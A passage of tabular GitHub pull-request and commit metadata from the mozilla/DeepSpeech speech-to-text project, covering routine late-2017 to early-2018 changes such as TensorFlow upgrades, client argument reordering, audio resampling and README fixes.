3296,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d378ac7ffa62a960b3bed490d65115aeaa5d456a,"reorder arguments in client.cc, client.py and client.js also update call sites in tc-test-utils.sh"
3297,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f9b3e3807c0c1c339ea263f522e155cf15e4c1f,"Merge pull request #1211 from divyanshj16/reorder_arguments

reorder arguments in client.cc, client.py and client.js."
3298,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcfd4fd409c3e2c32eb085151f9f87409b549bce,Update for r1.5
3299,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d3abe8948545be02fd7ee8a47fe83343619461c,"Merge pull request #1226 from lissyx/merge-r1.5

Merge r1.5"
3300,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c71120fb319368641b074c80c48bf87ca93f3a16,Merge remote-tracking branch 'upstream/master' into update-tf-master
3301,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1229,1229,Clean up export code and remove some TF 1.0 compat code (Fixes #1228),,reuben,477142,2018-02-14T14:28:36Z,MEMBER,True,22,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cee1ec0f17964d6a1138c2bbcfe7a075a34ca220,Remove deprecated session_bundle usage and clean up export code
3302,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1229,1229,Clean up export code and remove some TF 1.0 compat code (Fixes #1228),,reuben,477142,2018-02-14T14:28:36Z,MEMBER,True,22,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,983e13f218803bd1c37536073c41c3a435616525,Remove TF 1.0 compatibility hack
3303,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1227,1227,"reorder arguments in client.cc, client.py and client.js also update c…",…all sites in tc-test-utils.sh,lissyx,1645737,2018-02-13T15:20:37Z,COLLABORATOR,False,32,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d378ac7ffa62a960b3bed490d65115aeaa5d456a,"reorder arguments in client.cc, client.py and client.js also update call sites in tc-test-utils.sh"
3304,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1226,1226,Merge r1.5,,lissyx,1645737,2018-02-13T10:09:51Z,COLLABORATOR,True,27,32,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcfd4fd409c3e2c32eb085151f9f87409b549bce,Update for r1.5
3305,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1221,1221,Switch to reference TensorFlow r1.4 branch,,lissyx,1645737,2018-02-09T14:44:40Z,COLLABORATOR,True,21,21,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eac987a09c4fea31f0d5bb54fa1c83ee5a00a6e7,Switch to reference TensorFlow r1.4 branch
3306,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9d973a191fb0b15721b0847b18ad9c14905ee61,Create tf-master branch as WIP DeepSpeech against TensorFlow master
3307,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d28266e3555dfabab9c2da7331dcb45d71557748,Update AOT AllocMode
3308,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc4bffde6ccbeed98875dd9399df21942e0ce4de,Update TensorFlow pip requirements
3309,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc1f856dadc6fcd9cd2d408eb4ebb70e68449f9e,Update AOT build with TensorFlow master
3310,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1218,1218,Create tf-master branch as WIP DeepSpeech against TensorFlow master,,lissyx,1645737,2018-02-09T11:49:53Z,COLLABORATOR,False,26,32,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2abdcd5a2c6d8a0407eb84e947edf0b43595f634,Create tf-master branch as WIP DeepSpeech against TensorFlow master
3311,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2602830f557a9c3eb75a94182e30e593dbba613,Switch to TensorFlow master
3312,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c5bce48f50c727469e6bb70899fe22561ece8e9,Update AOT AllocMode
3313,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f194f97cff701f82224e3b03c6e2d7f3ea3ff082,Update TensorFlow pip requirements
3314,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16436dba276ba82301478d9a5aeffe517f967dc2,Update AOT build with TensorFlow master
3315,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1216,1216,Merge tf master 20180206,,lissyx,1645737,2018-02-08T10:47:05Z,COLLABORATOR,False,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3125844360fe586d5ef2f1c05176872253dc4225,Switch to TensorFlow master
3316,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1216,1216,Merge tf master 20180206,,lissyx,1645737,2018-02-08T10:47:05Z,COLLABORATOR,False,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75e4c37505608beb23976eaf828ed897f0e13bef,Update AOT AllocMode
3317,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1216,1216,Merge tf master 20180206,,lissyx,1645737,2018-02-08T10:47:05Z,COLLABORATOR,False,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93a5797864c33e46b0c441340430edecfdacbb98,Update TensorFlow pip requirements
3318,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1211,1211,"reorder arguments in client.cc, client.py and client.js. ","This PR resolves #1032 
This makes audio clip the last argument as requested. 
In client.cc I also changed the index at various location as in c++ CL arguments come as an list not as a dictionary unlike in node.js and python.",divyanshj16,16683472,2018-02-06T18:17:32Z,CONTRIBUTOR,True,32,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d378ac7ffa62a960b3bed490d65115aeaa5d456a,"reorder arguments in client.cc, client.py and client.js also update call sites in tc-test-utils.sh"
3319,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1209,1209,Make sure transcript field isn't coerced to float,This should prevent the float not iterable problems.,reuben,477142,2018-02-06T10:35:01Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d51f0d92eb269118cb1bb2325e991375b76a083,Make sure transcript field isn't coerced to float
3320,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1207,1207,Add different samplerate samples,Fixes #1022,lissyx,1645737,2018-02-05T15:57:25Z,COLLABORATOR,True,197,57,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,72298b8f6d6b8ac4d11d205c7cd92d3860292000,"Add different samplerate samples

Fixes #1022"
3321,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1206,1206,Add a link to the gst-deepspeech GStreamer plugin,"This adds a link in the README to the gst-deepspeech project which provides a GStreamer element that wraps DeepSpeech and performs basic audio segmentation, making it usable for continuous dictation within a multimedia pipeline.",Elleo,59350,2018-02-05T12:58:09Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e2a49bb17a01e24aa61259eb771da75c4062be75,Add a link to the gst-deepspeech GStreamer plugin
3322,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1205,1205,Convert hz pr,Running https://github.com/mozilla/DeepSpeech/pull/1203,lissyx,1645737,2018-02-05T10:01:25Z,COLLABORATOR,False,21,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1abcedfc993919b8baf2500aade5c595ed458781,Transcode input audio to 16 kHz when necessary
3323,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1203,1203,Transcode input audio to 16 kHz #1022,"If the wav file is not 16 kHz, conversion is done using SoX via a subprocess. The converted file is saved in a temporary folder and deleted after execution. #1022 Tested on Ubuntu 16.04",gnardari,5693195,2018-02-02T18:41:30Z,CONTRIBUTOR,True,21,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1abcedfc993919b8baf2500aade5c595ed458781,Transcode input audio to 16 kHz when necessary
3324,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1200,1200,Making v0.1.1 release,,lissyx,1645737,2018-01-31T12:15:47Z,COLLABORATOR,True,16,14,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b633048dffda044863d86982fa0d496e7ba574ea,Making v0.1.1 release
3325,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1197,1197,Move decoder module initialization to initialize_globals,"As of TF 1.5, you can't access tf.app.flags before `tf.app.run` is called.",reuben,477142,2018-01-23T17:35:15Z,MEMBER,True,8,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dfa4509ab4b6db471ca73dad5b750dc4e681b8d6,"Move decoder module initialization to initialize_globals

As of TF 1.5, you can't access tf.app.flags before `tf.app.run` is called."
3326,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1192,1192,One libdeepspeech basics,,lissyx,1645737,2018-01-22T09:50:56Z,COLLABORATOR,False,181,156,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,634bfef930fc3e09cfd5068d76e6ae8cf3a66794,"Build TensorFlow as monolithic into libdeepspeech.so

Also limit the set of included Ops to avoid wasting size."
3327,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1192,1192,One libdeepspeech basics,,lissyx,1645737,2018-01-22T09:50:56Z,COLLABORATOR,False,181,156,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21191c7da417b75a4510eb57843999d4820ab739,"Switch training model dependency to upstream-based

Currently, self-built Python package is not able to work, likely because
of the visibility of symbols. Let's switch to upstream TensorFlow for
now."
3328,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1192,1192,One libdeepspeech basics,,lissyx,1645737,2018-01-22T09:50:56Z,COLLABORATOR,False,181,156,82,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57af276a7882ee49a11764ca7c0223e10cb67a20,WIP: debug tfcompile host rebuild
3329,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1191,1191,WIP: debug tfcompile host rebuild,,lissyx,1645737,2018-01-22T09:10:20Z,COLLABORATOR,False,3,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,47209d72dd2bd8aab6c9431073b23a6afd81561a,WIP: debug tfcompile host rebuild
3330,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1190,1190,Use tfcompile prebuilt for host,Fixes #1189,lissyx,1645737,2018-01-21T11:59:25Z,COLLABORATOR,False,34,39,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53601afe072ff076d7555af1ed1285e0d807fe14,"Use tfcompile prebuilt for host

Fixes #1189"
3331,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1188,1188,Update docs and remove specific TensorFlow instructions,Fixes #1187,lissyx,1645737,2018-01-21T10:54:46Z,COLLABORATOR,True,1,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29b3e429703367c4ac59178baeea33b69ce1cda1,"Update docs and remove specific TensorFlow instructions

Fixes #1187

X-DeepSpeech: NOBUILD"
3332,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1185,1185,Pipe pip install into cat to disable progress bar spam in CI logs,,reuben,477142,2018-01-19T14:06:31Z,MEMBER,True,7,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a79d34073add14698eb3142557c10b74b7149e4d,Pipe pip install into cat to disable progress bar spam in CI logs
3333,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1184,1184,Switch to swig 3.0.10-1.2,Fixes #1183,lissyx,1645737,2018-01-19T10:15:39Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fee3e5cdf5878b1af1c6ebb01d9557bacb7b1833,"Switch to swig 3.0.10-1.2

Fixes #1183"
3334,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1178,1178,Switch URLs to commit-based,"sed \
  -ri 's/pip\.master\./pip.master.1390dc180e25b5821be80b407ddc5fad73d4ef6a./g' \
  taskcluster/*.yml

Fixes #1177",lissyx,1645737,2018-01-17T14:53:40Z,COLLABORATOR,True,36,36,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b4591cd6f594b1f0e7b176d4bd2e5d201f5f5459,"Switch URLs to commit-based

sed \
  -ri 's/pip\.master\./pip.master.1390dc180e25b5821be80b407ddc5fad73d4ef6a./g' \
  taskcluster/*.yml

Fixes #1177"
3335,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1174,1174,Document --initialize_from_frozen_model in README,,reuben,477142,2018-01-15T20:38:44Z,MEMBER,True,17,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ae5630a20c8b37348dc98070f2bb65d4ea2ed31,Document --initialize_from_frozen_model in README
3336,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1173,1173,WIP: Running TaskCluster OSX generic-worker VM,,lissyx,1645737,2018-01-15T14:18:47Z,COLLABORATOR,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6b751e73f51e23f5464206e4163ba87e5640f8bd,WIP: Running TaskCluster OSX generic-worker VM
3337,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1167,1167,Update DeepSpeech.py,typos only,MikalaiDrabovich,953399,2018-01-11T23:26:21Z,CONTRIBUTOR,True,11,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1fc8141a506dad9b7c174eea636b5e64be424407,"Update DeepSpeech.py

typos only"
3338,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1166,1166,Fix absl.flags._exceptions #999,https://github.com/mozilla/DeepSpeech/issues/999,MikalaiDrabovich,953399,2018-01-11T23:20:51Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a557be389928b573104218a592871076b7fc862,"Fix absl.flags._exceptions #999

https://github.com/mozilla/DeepSpeech/issues/999"
3339,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1165,1165,Fix #999,https://github.com/mozilla/DeepSpeech/issues/999,MikalaiDrabovich,953399,2018-01-11T22:37:13Z,CONTRIBUTOR,False,12,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95b833d6dfcde4c5a0d2c703298d1875d06a7613,"Fix #999

https://github.com/mozilla/DeepSpeech/issues/999"
3340,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1164,1164,Enable SWIG threads support in model.i,"Without this, `model.stt` will hold the GIL and block Python code in other threads.",reuben,477142,2018-01-10T23:38:58Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90f6aaa76070e762d82b1fa32e93ce1d403cd567,"Enable SWIG threads support in model.i

Without this, `model.stt` will hold the GIL and block Python code in other threads."
3341,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1153,1153,Compute edit distance on word level,"This should fix the regression from 18b4120f302131a6653b589696db507382f0b050.

@kdavis-mozilla can you test this with the checkpoint to see if the results make more sense? Thanks.",reuben,477142,2018-01-04T20:10:34Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0df4514ed7cdeab80aba382ad592f2e275a7edf8,"Compute edit distance on word level

This should fix the regression from 18b4120f302131a6653b589696db507382f0b050."
3342,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1152,1152,adding assert for wav freq check,Just running the PR.,lissyx,1645737,2018-01-04T17:16:38Z,COLLABORATOR,False,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45a9056ddc3fac9ae54f7040a5256b3c20a6ffda,adding assert for wav freq check
3343,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1151,1151,adding assert for input wav file frequency check in client.py,Fixes Issue #1150 ,pikumar,5239020,2018-01-04T16:23:34Z,NONE,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,45a9056ddc3fac9ae54f7040a5256b3c20a6ffda,adding assert for wav freq check
3344,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1149,1149,Initialize training from frozen model,"This flag allows one to resume training from a frozen model, but as documented on the flag, it does not restore optimizer parameters, so adjusting the learning rate is necessary. I think it's an OK requirement from users.",reuben,477142,2018-01-04T13:43:36Z,MEMBER,True,30,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffbbc12985e7f02403c68422697d5ac5305d3fd4,Initialize training from frozen model
3345,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1141,1141,Fix FLAGS.remove_export not working,Fixes https://github.com/mozilla/DeepSpeech/issues/1140. Separated this commit from https://github.com/mozilla/DeepSpeech/pull/1132#discussion_r159027991 as following the feedback.,nobuf,211832,2017-12-29T08:42:50Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5e1dd6d17753609cab811da45414f91b564f615,Fix FLAGS.remove_export not working
3346,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1132,1132,Pass string rather than exception object to log_error(),"Fixes https://github.com/mozilla/DeepSpeech/issues/1016

Steps to reproduce the bug:
```shell
mkdir models
./bin/run-ldc93s1.sh --decoder_library_path decode/libctc_decoder_with_kenlm.so --export_dir models
# Second time
./bin/run-ldc93s1.sh --decoder_library_path decode/libctc_decoder_with_kenlm.so --export_dir models
...skip...
Traceback (most recent call last):
  File ""DeepSpeech.py"", line 1830, in <module>
    tf.app.run()
  File ""/usr/local/lib/python2.7/site-packages/tensorflow/python/platform/app.py"", line 48, in run
    _sys.exit(main(_sys.argv[:1] + flags_passthrough))
  File ""DeepSpeech.py"", line 1821, in main
    export()
  File ""DeepSpeech.py"", line 1747, in export
    log_error(sys.exc_info()[1])
  File ""DeepSpeech.py"", line 349, in log_error
    prefix_print('E ', message)
  File ""DeepSpeech.py"", line 329, in prefix_print
    print(prefix + ('\n' + prefix).join(message.split('\n')))
AttributeError: 'exceptions.RuntimeError' object has no attribute 'split'
```

I wasn't sure if using `sys.exc_info()` was intentional, thought `RuntimeError as e` would be a bit more readable.

UPDATE: I found a misspelled variable which kind of related to this issue. Since it's a tiny pull request, I've included it as well.",nobuf,211832,2017-12-22T23:21:20Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f74450b841b36b63898d0ca48c85354081afaf31,"Fix #1016 pass string to log_error

Casting to string instead of accessing message for consistency"
3347,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1130,1130,Fixed #1046,,kdavis-mozilla,12054740,2017-12-21T16:02:06Z,CONTRIBUTOR,True,8,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18b4120f302131a6653b589696db507382f0b050,Fixed #1046
3348,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1130,1130,Fixed #1046,,kdavis-mozilla,12054740,2017-12-21T16:02:06Z,CONTRIBUTOR,True,8,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,967e6363a788f21eafecc7779cdfd07af7fc5997,Addessed review comments
3349,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1130,1130,Fixed #1046,,kdavis-mozilla,12054740,2017-12-21T16:02:06Z,CONTRIBUTOR,True,8,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9051fafaf829c7f50ea6281f24827d6d8a7996c7,Simplified code
3350,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1127,1127,Build TensorFlow as monolithic into libdeepspeech.so,Also limit the set of included Ops to avoid wasting size.,lissyx,1645737,2017-12-20T18:30:30Z,COLLABORATOR,True,498,161,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ade66b015ded24bbefee9c09bb131e578e055492,"Build TensorFlow as monolithic into libdeepspeech.so

Also limit the set of included Ops to avoid wasting size."
3351,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1127,1127,Build TensorFlow as monolithic into libdeepspeech.so,Also limit the set of included Ops to avoid wasting size.,lissyx,1645737,2017-12-20T18:30:30Z,COLLABORATOR,True,498,161,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30857cc2886559e674d5ab69c57717f29e55cff9,"Switch training model dependency to upstream-based

Currently, self-built Python package is not able to work, likely because
of the visibility of symbols. Let's switch to upstream TensorFlow for
now."
3352,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1127,1127,Build TensorFlow as monolithic into libdeepspeech.so,Also limit the set of included Ops to avoid wasting size.,lissyx,1645737,2017-12-20T18:30:30Z,COLLABORATOR,True,498,161,84,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11fcae4bc74cd367b846b3b4fb342c4db3ecf9a9,"Proper re-use of Bazel cache

Fixes #1189"
3353,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1120,1120,Check if the transcription is empty,,lparam,657233,2017-12-19T11:18:41Z,CONTRIBUTOR,False,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97d1849822cd4c385a71bf58b14886c8fb90bb35,Check if the transcription is empty
3354,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1117,1117,Avoid over-linking deepspeech.utils Python wrapper,Fixes #1116,lissyx,1645737,2017-12-19T04:04:12Z,COLLABORATOR,True,81,7,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,968c22c392bf1a6d305542e72bfa2d5ec5bb6113,"Avoid over-linking deepspeech.utils Python wrapper

Fixes #1116"
3355,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1113,1113,Fix outdated command in docu,Fixes https://github.com/mozilla/DeepSpeech/issues/1084,onny,757752,2017-12-17T12:39:14Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,54d1adb8951bdcea3b5a05e4e80626c3b110b372,"Fix outdated command in docu

Fixes https://github.com/mozilla/DeepSpeech/issues/1084"
3356,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1109,1109,README: Point to 3rd party arch linux PKGBUILDs,Referring to @lissyx 's request in issue #979,stes,727984,2017-12-14T23:08:59Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a24699afe7715103ea0a3c079e0723c35e765906,README: Pointing to 3rd party arch linux PKGBUILDs
3357,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1104,1104,README.md Suggestions,"When installing DeepSpeech, I didn't notice the version of python (which is listed only once in the dependencies section). I went straight to setting up a virtualenv, and the process for doing so is different on Python 2 vs Python 3. So I suggest mentioning the python version when virtualenv is first mentioned.

Also, on Debian-derived systems there is a package `git-lfs` which makes it unnecessary to install Git Large File System manually.",dwks,713495,2017-12-13T18:12:56Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,302552f71bccff94f233ca8552c27a4b6c3e065e,Mention git-lfs package available on Debian.
3358,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1104,1104,README.md Suggestions,"When installing DeepSpeech, I didn't notice the version of python (which is listed only once in the dependencies section). I went straight to setting up a virtualenv, and the process for doing so is different on Python 2 vs Python 3. So I suggest mentioning the python version when virtualenv is first mentioned.

